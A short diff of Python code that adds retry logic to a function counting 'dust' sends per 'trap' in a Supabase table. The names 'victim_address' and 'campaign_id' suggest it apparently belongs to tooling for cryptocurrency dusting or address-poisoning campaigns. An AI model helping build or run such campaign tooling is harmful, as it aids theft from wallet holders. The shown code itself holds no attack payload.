@@ -1096,19 +1096,40 @@ def update_trap_dust_count(trap_id):
     """Increment dust_count and update last_dusted_at for a trap."""
     if not supabase or not trap_id:
         return
-    try:
-        now_iso = datetime.now(timezone.utc).isoformat()
-        # Fetch current dust_count, increment, and update
-        result = supabase.table("traps").select("dust_count").eq("id", trap_id).execute()
-        current_count = 0
-        if result.data and len(result.data) > 0:
-            current_count = result.data[0].get("dust_count", 0) or 0
-        supabase.table("traps").update({
-            "dust_count": current_count + 1,
-            "last_dusted_at": now_iso
-        }).eq("id", trap_id).execute()
-    except Exception as e:
-        logger.warning(f"Failed to update dust_count for trap {trap_id}: {e}")
+    
+    now_iso = datetime.now(timezone.utc).isoformat()
+    
+    for attempt in range(3):
+        try:
+            # Fetch current dust_count, increment, and update
+            result = supabase.table("traps").select("dust_count").eq("id", trap_id).execute()
+            current_count = 0
+            if result.data and len(result.data) > 0:
+                current_count = result.data[0].get("dust_count", 0) or 0
+            
+            supabase.table("traps").update({
+                "dust_count": current_count + 1,
+                "last_dusted_at": now_iso
+            }).eq("id", trap_id).execute()
+            
+            # Success - break out of retry loop
+            return
+            
+        except Exception as e:
+            err_str = str(e).lower()
+            logger.warning(f"Failed to update dust_count for trap {trap_id} (attempt {attempt + 1}/3): {e}")
+            
+            # If it's a connection error, wait before retrying
+            if "broken pipe" in err_str or "connection" in err_str or "timeout" in err_str:
+                if attempt < 2:
+                    logger.info(f"Connection error detected. Retrying in 3 seconds...")
+                    time.sleep(3)
+                    continue
+            
+            # If it's not a connection error, don't retry
+            break
+    
+    logger.error(f"All 3 attempts failed for dust_count update on trap {trap_id}")
 
 
 def get_counterparty_from_db(victim_address, campaign_id):
